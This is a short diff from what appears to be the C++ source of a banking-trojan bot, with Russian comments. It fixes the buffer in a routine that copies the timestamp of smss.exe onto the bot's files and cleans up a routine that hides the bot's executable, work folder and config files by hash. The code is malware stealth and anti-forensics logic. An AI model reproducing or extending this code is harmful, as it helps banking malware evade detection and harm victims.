@@ -49,7 +49,7 @@ void SetFakeFileDateTime(PCHAR Path)
 	WCHAR smss[] = {'\\','s','m','s','s','.','e','x','e',0};
 
 	// Получаем дату и время системмного файла
-	WCHAR *SysPath = (WCHAR *)MemAlloc( 512 );
+	WCHAR *SysPath = (WCHAR *)MemAlloc( 512 * sizeof(WCHAR) );
 
 	if (SysPath == NULL)
 		return;
@@ -225,24 +225,6 @@ WCHAR *GetTempName()
 
 //----------------------------------------------------------------------------
 
-//BOOL IsHide( DWORD dwFileHash )
-//{
-//	if ( dwFileHash == BOT::GetBotExeNameHash() ||
-//	     dwFileHash == BOT::GetWorkFolderHash() ||
-//		 dwFileHash == BOT_CFGN_HASH ||
-//		 dwFileHash == BOT_STAV_HASH ||
-//		 dwFileHash == BOT_MNAV_HASH ||
-//		 dwFileHash == BANKING_SIGNAL_FILE_HASH
-//		 )
-//	{
-//		return TRUE;
-//	}
-//
-//	return FALSE;
-//}
-
-//----------------------------------------------------------------------------
-
 BOOL IsHideFile(PWCHAR FileName, ULONG FileNameLen, int ControlPoint)
 {
 	//  Функция возвращает истину, если необходимо спрятать
@@ -257,10 +239,6 @@ BOOL IsHideFile(PWCHAR FileName, ULONG FileNameLen, int ControlPoint)
 
 	// Определяем хэш файла
 	DWORD Hash = STRW::Hash(FileName, Len, false);
-
-//	wstring Str;
-//	Str.Format(L"1---%d----- %s", ControlPoint, FileName);
-//	pOutputDebugStringW(Str.t_str());
 
 	// Проверяем хэш
 	BOOL Hide = BOT::IsHiddenFile(Hash);
